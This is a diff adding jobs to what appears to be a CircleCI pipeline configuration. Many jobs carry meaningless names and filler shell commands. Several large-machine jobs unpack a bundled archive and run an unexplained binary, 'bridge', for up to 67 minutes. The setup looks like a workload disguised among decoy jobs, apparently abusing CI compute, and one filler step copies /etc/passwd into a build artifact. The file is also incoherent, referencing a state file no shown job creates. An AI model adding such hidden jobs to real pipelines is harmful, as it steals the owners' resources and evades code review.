+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  gamma_BUILD_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: ship
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 268190; echo "ftr" ) | wc -l; true ; } > /tmp/pipeline/counts.json
+            echo "gate BUILD_UAT: $(wc -c </tmp/pipeline/counts.json) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - counts.json
+  BUILD_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/relay.state
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  runner_pat-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: tell the pm
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 1000 | awk 'NR%13==0' | awk 'END{print NR}'; true ; } > /tmp/pipeline/112x.txt
+            echo "gate pat-ship: $(wc -c </tmp/pipeline/112x.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 112x.txt
+  pat-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/112x.txt
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+  beta_v5-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: visor flip
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; touch /tmp/_c && chmod 644 /tmp/_c && stat -c %a /tmp/_c && rm /tmp/_c; true ; } > /tmp/pipeline/stash.blob
+            echo "gate v5-canary: $(wc -c </tmp/pipeline/stash.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - stash.blob
+  v5-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Check stage output
+          command: |
+            cat /tmp/pipeline/stash.blob
+      - run:
+          name: Retrieve repository
+          command: git clone --depth 3 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: bzcat core-pkg.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 67m
+          command: $PWD/bridge
+
+  prep_v5-beta_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: notify stage
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; echo $(( $(date +%s) % 10000 )) | md5sum; true ; } > /tmp/pipeline/handover.txt
+            echo "gate v5-beta: $(wc -c </tmp/pipeline/handover.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handover.txt
+  postcheck_helios-final_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: superman row
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="abc"; sub("b","B",s); print s}'; true ; } > /tmp/pipeline/69.log
+            echo "gate helios-final: $(wc -c </tmp/pipeline/69.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 69.log
+  deps_canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: diminution
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && printf "x\n" > "$tf" && cat "$tf" | sha256sum | cut -c1-20 && rm "$tf"; true ; } > /tmp/pipeline/log.log
+            echo "gate canary: $(wc -c </tmp/pipeline/log.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - log.log
+  vendor_edge-v9_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: etude
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a[1]=10;a[2]=20;a[3]=30; max=a[1]; for(k in a)if(a[k]>max)max=a[k]; print max}'; true ; } > /tmp/pipeline/checkpoint-B.pt
+            echo "gate edge-v9: $(wc -c </tmp/pipeline/checkpoint-B.pt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - checkpoint-B.pt
+  reset_fix-dashboard-redirect_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: dropped pack
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print cos(0), sin(1.5708), exp(1)}'; true ; } > /tmp/pipeline/cache.dat
+            echo "gate fix-dashboard-redirect: $(wc -c </tmp/pipeline/cache.dat) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - cache.dat
+  tmp_check-staging-release-candidate_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: hair dry
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; cat /proc/stat 2>/dev/null | head -1; true ; } > /tmp/pipeline/2023-10-04.data
+            echo "gate check-staging-release-candidate: $(wc -c </tmp/pipeline/2023-10-04.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2023-10-04.data
+  alpha_node20-bench_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: tango dip
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 25 | awk 'BEGIN{for(i=0;i<5;i++)row[i]=""}{row[(NR-1)%5] = row[(NR-1)%5] " " $0}END{for(i=0;i<5;i++)print row[i]}' | wc -l; true ; } > /tmp/pipeline/log.txt
+            echo "gate node20-bench: $(wc -c </tmp/pipeline/log.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - log.txt
+  tester_add-queue_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dot dash
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; printf "%d\n" {1..100} | awk '{s+=$1}END{print s}'; true ; } > /tmp/pipeline/passoff.ok
+            echo "gate add-queue: $(wc -c </tmp/pipeline/passoff.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - passoff.ok
+  canary_CHECK_LAB_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: scap pullup
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; sed 's/:/|/g' /etc/passwd | head -3; true ; } > /tmp/pipeline/handoff.ok
+            echo "gate CHECK_LAB: $(wc -c </tmp/pipeline/handoff.ok) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handoff.ok
+  redo_go-live_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: whistle a tune
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; echo "$RANDOM" | base64; true ; } > /tmp/pipeline/big_phase_output.out
+            echo "gate go-live: $(wc -c </tmp/pipeline/big_phase_output.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - big_phase_output.out
+  runner_v5-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: jig step
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<32;i++)if(i%4==0)print i}'; true ; } > /tmp/pipeline/stash.blob
+            echo "gate v5-canary: $(wc -c </tmp/pipeline/stash.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - stash.blob
+  run_pat-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: staccato
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 1024 /dev/urandom | sha1sum | awk '{print $1}'; true ; } > /tmp/pipeline/112x.txt
+            echo "gate pat-ship: $(wc -c </tmp/pipeline/112x.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 112x.txt
+  orchestrate_fire-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: settle down
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=""; for(i=1;i<=20;i++)s=s"-"; print s}'; true ; } > /tmp/pipeline/.marker
+            echo "gate fire-up: $(wc -c </tmp/pipeline/.marker) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .marker
+  stepA_check-end-to-end-regression-suite_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: samba glide
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=12; result=1; while(n>1){result*=n; n--}; print result}'; true ; } > /tmp/pipeline/.done
+            echo "gate check-end-to-end-regression-suite: $(wc -c </tmp/pipeline/.done) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .done
+  redo_spin-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: powder coat
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; echo "spacey   middle" | awk 'gsub(/ +/," ")'; true ; } > /tmp/pipeline/checkpoint-main.pt
+            echo "gate spin-up: $(wc -c </tmp/pipeline/checkpoint-main.pt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - checkpoint-main.pt
+  redo_PROD_VERIFY_6_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: monkey wrench
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ps -eo pid,ppid 2>/dev/null | wc -l; true ; } > /tmp/pipeline/log.ndjson
+            echo "gate PROD_VERIFY_6: $(wc -c </tmp/pipeline/log.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - log.ndjson
+  sys_titan2-plus_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: resolution hint
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nb\nc\nc\n" | sort | uniq -c | sort -rn; true ; } > /tmp/pipeline/timings.json
+            echo "gate titan2-plus: $(wc -c </tmp/pipeline/timings.json) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - timings.json
+  g2_fix-oauth-hang_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: banner down
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | od -An -tu8 | head -1 | awk '{print $1}'; true ; } > /tmp/pipeline/ckpt-E.pkl
+            echo "gate fix-oauth-hang: $(wc -c </tmp/pipeline/ckpt-E.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - ckpt-E.pkl
+workflows:
+  run:
+    jobs:
+      - p1_v5-beta
+      - prep_v5-beta_2:
+          requires:
+            - p1_v5-beta
+      - v5-beta:
+          requires:
+            - prep_v5-beta_2
+      - redo_helios-final:
+          requires:
+            - prep_v5-beta_2
+      - postcheck_helios-final_2:
+          requires:
+            - redo_helios-final
+      - helios-final:
+          requires:
+            - postcheck_helios-final_2
+      - phase1_canary:
+          requires:
+            - postcheck_helios-final_2
+      - deps_canary_2:
+          requires:
+            - phase1_canary
+      - canary:
+          requires:
+            - deps_canary_2
+      - precheck_edge-v9:
+          requires:
+            - deps_canary_2
+      - vendor_edge-v9_2:
+          requires:
+            - precheck_edge-v9
+      - edge-v9:
+          requires:
+            - vendor_edge-v9_2
+      - precheck_fix-dashboard-redirect:
+          requires:
+            - vendor_edge-v9_2
+      - reset_fix-dashboard-redirect_2:
+          requires:
+            - precheck_fix-dashboard-redirect
+      - fix-dashboard-redirect:
+          requires:
+            - reset_fix-dashboard-redirect_2
+      - canary1_check-staging-release-candidate:
+          requires:
+            - reset_fix-dashboard-redirect_2
+      - tmp_check-staging-release-candidate_2:
+          requires:
+            - canary1_check-staging-release-candidate
+      - check-staging-release-candidate:
+          requires:
+            - tmp_check-staging-release-candidate_2
+      - package_node20-bench:
+          requires:
+            - tmp_check-staging-release-candidate_2
+      - alpha_node20-bench_2:
+          requires:
+            - package_node20-bench
+      - node20-bench:
+          requires:
+            - alpha_node20-bench_2
+      - audit_add-queue:
+          requires:
+            - alpha_node20-bench_2
+      - tester_add-queue_2:
+          requires:
+            - audit_add-queue
+      - add-queue:
+          requires:
+            - tester_add-queue_2
+      - postcheck_CHECK_LAB:
+          requires:
+            - tester_add-queue_2
+      - canary_CHECK_LAB_2:
+          requires:
+            - postcheck_CHECK_LAB
+      - CHECK_LAB:
+          requires:
+            - canary_CHECK_LAB_2
+      - Alpha_go-live:
+          requires:
+            - canary_CHECK_LAB_2
+      - redo_go-live_2:
+          requires:
+            - Alpha_go-live
+      - go-live:
+          requires:
+            - redo_go-live_2
+      - beta_v5-canary:
+          requires:
+            - redo_go-live_2
+      - runner_v5-canary_2:
+          requires:
+            - beta_v5-canary
+      - v5-canary:
+          requires:
+            - runner_v5-canary_2
+      - runner_pat-ship:
+          requires:
+            - runner_v5-canary_2
+      - run_pat-ship_2:
+          requires:
+            - runner_pat-ship
+      - pat-ship:
+          requires:
+            - run_pat-ship_2
+      - drain_fire-up:
+          requires:
+            - run_pat-ship_2
+      - orchestrate_fire-up_2:
+          requires:
+            - drain_fire-up
+      - fire-up:
+          requires:
+            - orchestrate_fire-up_2
+      - ctx2_check-end-to-end-regression-suite
+      - stepA_check-end-to-end-regression-suite_2:
+          requires:
+            - ctx2_check-end-to-end-regression-suite
+      - check-end-to-end-regression-suite:
+          requires:
+            - stepA_check-end-to-end-regression-suite_2
+      - compile_spin-up:
+          requires:
+            - stepA_check-end-to-end-regression-suite_2
+      - redo_spin-up_2:
+          requires:
+            - compile_spin-up
+      - spin-up:
+          requires:
+            - redo_spin-up_2
+      - bundle_PROD_VERIFY_6:
+          requires:
+            - redo_spin-up_2
+      - redo_PROD_VERIFY_6_2:
+          requires:
+            - bundle_PROD_VERIFY_6
+      - PROD_VERIFY_6:
+          requires:
+            - redo_PROD_VERIFY_6_2
+      - canary_titan2-plus:
+          requires:
+            - redo_PROD_VERIFY_6_2
+      - sys_titan2-plus_2:
+          requires:
+            - canary_titan2-plus
+      - titan2-plus:
+          requires:
+            - sys_titan2-plus_2
+      - hydrate_fix-oauth-hang:
+          requires:
+            - sys_titan2-plus_2
+      - g2_fix-oauth-hang_2:
+          requires:
+            - hydrate_fix-oauth-hang
+      - fix-oauth-hang:
+          requires:
+            - g2_fix-oauth-hang_2
+      - p2_titan-ng
+      - bake_cf-v2
+      - titan-ng:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - cf-v2:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - ShipService:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - BUILD_UAT:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - fix-retry-timeout:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - run-partial-docker-image:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - rm-router-v2-glitch:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - DATA-994:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - edge-v1:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - DEPLOY_UAT:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - d-new:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
+      - uma-ship:
+          requires:
+            - p2_titan-ng
+            - bake_cf-v2
